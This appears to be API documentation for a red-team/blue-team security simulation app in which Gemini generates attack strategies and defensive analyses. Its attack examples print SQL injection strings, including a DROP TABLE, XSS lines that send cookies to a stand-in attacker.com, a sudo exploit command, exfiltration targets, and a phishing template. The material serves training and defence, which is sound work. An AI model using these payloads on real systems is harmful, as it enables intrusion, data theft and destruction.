# 🔌 API Examples & Expected Responses

## Gemini API Integration Examples

### 1. Red Team Attack Generation

#### Request
```typescript
generateRedTeamAttack('SQL Injection', 'Enterprise Web Application')
```

#### Expected Response
```json
{
  "strategy": "Exploit authentication bypass using UNION-based SQL injection. Target the login endpoint with crafted payloads to extract user credentials from the database.",
  "payload": "' UNION SELECT username, password, email FROM users WHERE '1'='1",
  "expectedImpact": "Unauthorized access to user database, potential credential theft, and authentication bypass leading to full system compromise."
}
```

#### Real Gemini Response Example
```
Strategy: The attack will focus on the login form, attempting to inject SQL commands through the username field. By using a UNION SELECT statement, we can extract sensitive data from the users table. The payload is designed to bypass input validation and exploit poor parameterization.

Payload: admin' OR '1'='1' --

Expected Impact: If successful, this will grant unauthorized access to the admin panel, expose user credentials, and potentially allow lateral movement within the system.
```

### 2. Blue Team Defense Analysis

#### Request
```typescript
generateBlueTeamResponse(
  'SQL Injection',
  'Detected malicious SQL patterns in login endpoint'
)
```

#### Expected Response
```json
{
  "analysis": "SQL injection attempt detected targeting authentication mechanism. Pattern matches known UNION-based attack signatures. High confidence malicious intent.",
  "mitigation": "Implement parameterized queries, enable WAF rules for SQL injection patterns, sanitize user inputs, and temporarily rate-limit the affected endpoint.",
  "confidence": 94
}
```

#### Real Gemini Response Example
```
Analysis: The threat exhibits classic SQL injection characteristics with UNION SELECT statements attempting to extract data from the users table. The attack vector is the login form's username parameter, which lacks proper input validation. This is a high-severity threat requiring immediate action.

Mitigation: Deploy WAF rules to block SQL keywords in user inputs. Implement prepared statements with parameterized queries. Enable input validation and sanitization. Monitor for similar patterns from the source IP. Consider temporary account lockout for affected endpoints.

Confidence: 92
```

### 3. Strategic Orchestrator Decision

#### Request
```typescript
generateStrategicDecision(
  'Red Agents: SQL Injection on /api/login. Blue Agents: WAF blocking 80% of traffic.'
)
```

#### Expected Response
```
THREAT ASSESSMENT:
The Red Team is executing SQL injection attacks against the authentication endpoint. Current Blue Team defenses are partially effective with 80% block rate, but sophisticated payloads are bypassing WAF signatures.

STRATEGIC RECOMMENDATIONS:
1. Blue Team should enhance WAF rules to detect obfuscated SQL patterns
2. Implement database-level query monitoring and anomaly detection
3. Deploy honeypot endpoints to identify attack patterns
4. Red Team should test XSS vectors to assess lateral defense capabilities

VULNERABILITIES IDENTIFIED:
- Input validation gaps in authentication layer
- WAF signature evasion possible through encoding
- Lack of rate limiting on login endpoint
```

## Attack Type Examples

### SQL Injection

**User Action**: Click "SQL Injection" button

**AI Generated Strategy**:
```
"Exploit weak input validation in the web application's database query layer. Use UNION-based injection to extract sensitive data from backend tables. Target authentication endpoints where user input is directly concatenated into SQL queries."
```

**AI Generated Payload**:
```sql
' OR 1=1; DROP TABLE users; --
admin' UNION SELECT null, username, password FROM users--
' AND 1=0 UNION SELECT table_name FROM information_schema.tables--
```

**Expected Impact**:
```
"Successful exploitation would allow unauthorized database access, potential data exfiltration of user credentials, and possible database manipulation or deletion. Critical severity threat requiring immediate mitigation."
```

### Cross-Site Scripting (XSS)

**AI Generated Strategy**:
```
"Inject malicious JavaScript into user-facing input fields that are rendered without proper sanitization. Target comment sections, profile fields, or search parameters. Payload will execute in victim browsers to steal session tokens."
```

**AI Generated Payload**:
```javascript
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
<img src=x onerror="alert(document.cookie)">
<svg onload="window.location='https://attacker.com?data='+btoa(document.body.innerHTML)">
```

**Expected Impact**:
```
"Session hijacking, cookie theft, credential harvesting, and potential account takeover. Affects all users who view the injected content. Medium to high severity depending on session management."
```

### Brute Force

**AI Generated Strategy**:
```
"Systematically attempt common password combinations against user accounts. Use dictionary attacks combined with common password patterns. Target accounts without rate limiting or account lockout mechanisms."
```

**AI Generated Payload**:
```
Password list: admin123, password, 123456, qwerty, letmein
Technique: Parallel requests with rotating proxies
Rate: 100 attempts per minute per account
```

**Expected Impact**:
```
"Successful brute force would compromise user accounts, especially those with weak passwords. Could lead to unauthorized access, data theft, and lateral movement within the system."
```

### Phishing Campaign

**AI Generated Strategy**:
```
"Create convincing replica of company login page. Craft targeted emails with urgent call-to-action. Use social engineering to trick users into entering credentials on fake site. Harvest credentials for later use."
```

**AI Generated Payload**:
```
Email Subject: "URGENT: Security Update Required"
Body: "Your account will be suspended unless you verify your credentials immediately."
Link: https://company-login-verify[.]com (typosquatting)
```

**Expected Impact**:
```
"High success rate for credential harvesting. Compromised accounts can be used for further attacks, data access, or sold on dark web. Difficult to detect until credentials are used maliciously."
```

### Ransomware Simulation

**AI Generated Strategy**:
```
"Simulate file encryption attack targeting critical business data. Demonstrate impact of ransomware by identifying high-value targets. Show encryption speed and recovery challenges without proper backups."
```

**AI Generated Payload**:
```
Target: /data/critical/*.db, /backups/*, /documents/*
Encryption: AES-256 with unique key per file
Ransom Note: "Your files have been encrypted. Pay 5 BTC to recover."
```

**Expected Impact**:
```
"Complete data unavailability, business disruption, potential data loss if backups compromised. Recovery without decryption key nearly impossible. Critical severity requiring immediate incident response."
```

### DDoS Attack

**AI Generated Strategy**:
```
"Overwhelm target infrastructure with massive traffic volume. Use distributed botnet to amplify attack. Target application layer to exhaust server resources. Bypass basic rate limiting through request variation."
```

**AI Generated Payload**:
```
Attack Type: HTTP Flood
Request Rate: 100,000 requests/second
Source IPs: 10,000+ distributed nodes
Target: /api/search (resource-intensive endpoint)
```

**Expected Impact**:
```
"Service unavailability, legitimate user lockout, potential infrastructure costs from auto-scaling. Business disruption and reputation damage. Requires DDoS mitigation service to defend."
```

### Privilege Escalation

**AI Generated Strategy**:
```
"Exploit misconfigured permissions or vulnerable services to gain elevated privileges. Target SUID binaries, kernel vulnerabilities, or weak access controls. Escalate from standard user to root/admin."
```

**AI Generated Payload**:
```
Technique: Exploit CVE-2021-3156 (sudo vulnerability)
Command: sudoedit -s /
Result: Root shell access
```

**Expected Impact**:
```
"Complete system compromise with administrative privileges. Ability to install backdoors, access all data, modify system configurations, and persist access. Critical severity requiring immediate patching."
```

### Data Exfiltration

**AI Generated Strategy**:
```
"Identify and extract sensitive data from target systems. Use covert channels to avoid detection. Compress and encrypt data before transmission. Target customer databases, intellectual property, and credentials."
```

**AI Generated Payload**:
```
Target Data: /var/db/customers.sql, /app/secrets/*, /home/*/.ssh/
Exfiltration Method: DNS tunneling, HTTPS to external server
Compression: gzip + base64 encoding
```

**Expected Impact**:
```
"Loss of sensitive customer data, intellectual property theft, regulatory compliance violations, potential lawsuits, and severe reputation damage. High-value target for attackers."
```

## Blue Team Response Examples

### Detecting SQL Injection

**AI Analysis**:
```
"Threat Analysis: Multiple SQL injection attempts detected from IP 192.168.1.50. Attack patterns match UNION-based and boolean-based blind SQL injection techniques. Target is the /api/login endpoint. Attack sophistication: Medium. Evasion attempts: Encoding and comment obfuscation."
```

**AI Mitigation**:
```
"Immediate Actions:
1. Block source IP 192.168.1.50 at firewall level
2. Enable WAF rule set for SQL injection patterns
3. Implement parameterized queries on affected endpoint
4. Enable query logging for forensic analysis
5. Alert security team for incident response
6. Scan for similar patterns from other IPs"
```

**Confidence Score**: 89-95%

### Detecting XSS

**AI Analysis**:
```
"Cross-site scripting attempt identified in user comment field. Payload contains JavaScript attempting to steal session cookies. Attack vector: Stored XSS. Potential impact: All users viewing the comment. Severity: High."
```

**AI Mitigation**:
```
"Defense Strategy:
1. Sanitize and remove malicious comment immediately
2. Implement Content Security Policy (CSP) headers
3. Enable output encoding for all user-generated content
4. Deploy XSS filter in WAF
5. Audit all input fields for similar vulnerabilities
6. Notify affected users to change passwords"
```

**Confidence Score**: 92-98%

### Detecting Brute Force

**AI Analysis**:
```
"Brute force attack detected against user accounts. Pattern: 500+ failed login attempts in 5 minutes from single IP. Target accounts: admin, root, user1. Attack tool signature: Hydra or similar. Threat level: Medium."
```

**AI Mitigation**:
```
"Countermeasures:
1. Implement account lockout after 5 failed attempts
2. Enable CAPTCHA on login form
3. Block attacking IP address
4. Implement rate limiting: 3 attempts per minute
5. Enable multi-factor authentication
6. Alert affected users of attack attempt"
```

**Confidence Score**: 96-99%

## Orchestrator Strategic Analysis Examples

### Scenario 1: Active Attack Campaign

**Context**: Multiple Red Team attacks in progress

**AI Strategic Decision**:
```
SITUATION ASSESSMENT:
Red Team is executing a coordinated attack campaign with SQL injection, XSS, and brute force vectors. Blue Team defenses are responding but showing gaps in coverage.

THREAT LANDSCAPE:
- SQL injection: 60% blocked, 40% reaching application layer
- XSS: 85% blocked, stored XSS vulnerability identified
- Brute force: 95% blocked, rate limiting effective

STRATEGIC RECOMMENDATIONS:

For Blue Team:
1. Priority: Patch stored XSS vulnerability immediately
2. Enhance SQL injection detection with ML-based anomaly detection
3. Implement honeypot accounts to identify brute force patterns
4. Deploy additional monitoring on application layer

For Red Team:
5. Test privilege escalation vectors to assess internal defenses
6. Attempt data exfiltration to evaluate DLP controls
7. Simulate insider threat scenarios

SYSTEM VULNERABILITIES:
- Input validation gaps in legacy endpoints
- Insufficient logging on API layer
- Missing rate limiting on several endpoints
- Outdated WAF signature database

RECOMMENDED ACTIONS:
Immediate: Patch XSS, update WAF rules
Short-term: Implement comprehensive input validation
Long-term: Deploy ML-based threat detection
```

### Scenario 2: Defense Optimization

**Context**: Blue Team successfully blocking attacks

**AI Strategic Decision**:
```
PERFORMANCE ANALYSIS:
Blue Team is performing exceptionally well with 92% attack block rate. Defense mechanisms are well-coordinated and response times are optimal.

STRENGTHS IDENTIFIED:
- Rapid threat detection (< 2 seconds)
- Effective WAF configuration
- Strong incident response procedures
- Good agent coordination

AREAS FOR IMPROVEMENT:
- 8% of attacks still bypassing defenses
- False positive rate could be reduced
- Response automation could be enhanced

STRATEGIC RECOMMENDATIONS:
1. Analyze the 8% bypass rate to identify patterns
2. Fine-tune WAF rules to reduce false positives
3. Implement automated response playbooks
4. Enhance threat intelligence integration
5. Consider predictive threat modeling

NEXT STEPS:
- Red Team should increase attack sophistication
- Test zero-day simulation scenarios
- Evaluate defense against APT tactics
```

## API Error Handling Examples

### Rate Limit Exceeded

**Error**:
```json
{
  "error": {
    "code": 429,
    "message": "Resource has been exhausted (e.g. check quota)."
  }
}
```

**App Response**:
```
"Rate limit exceeded. Please wait 60 seconds before launching another attack. Free tier allows 15 requests per minute."
```

### Invalid API Key

**Error**:
```json
{
  "error": {
    "code": 400,
    "message": "API key not valid."
  }
}
```

**App Response**:
```
"Invalid API key. Please check your VITE_GEMINI_API_KEY in .env.local and ensure it's a valid Gemini API key from aistudio.google.com"
```

### Network Error

**Error**:
```
TypeError: Failed to fetch
```

**App Response**:
```
"Network error connecting to Gemini API. Please check your internet connection and try again."
```

## Testing the API

### Quick Test Script

```bash
# Test if API key works
curl -X POST \
  https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash-exp:generateContent?key=YOUR_API_KEY \
  -H 'Content-Type: application/json' \
  -d '{
    "contents": [{
      "parts": [{
        "text": "Say hello"
      }]
    }]
  }'
```

**Expected Response**:
```json
{
  "candidates": [{
    "content": {
      "parts": [{
        "text": "Hello! How can I help you today?"
      }]
    }
  }]
}
```

## Performance Benchmarks

| Operation | API Calls | Avg Time | Max Time |
|-----------|-----------|----------|----------|
| Launch Attack | 1 | 1.5s | 3s |
| Defense Response | 1 | 1.8s | 3s |
| Strategic Decision | 1 | 2.2s | 4s |
| **Total Attack Flow** | 2 | 3.3s | 6s |

## API Usage Patterns

### Typical Session (10 minutes)
- 5 attacks launched = 5 API calls
- 5 defense responses = 5 API calls
- 1 orchestrator update = 1 API call
- **Total**: 11 API calls

### Heavy Usage (1 hour)
- 30 attacks = 30 API calls
- 30 defenses = 30 API calls
- 6 orchestrator updates = 6 API calls
- **Total**: 66 API calls

**Free Tier Limit**: 1,500 requests/day = ~22 hours of heavy usage

---

**Note**: All examples are representative. Actual AI responses will vary based on context and model updates.
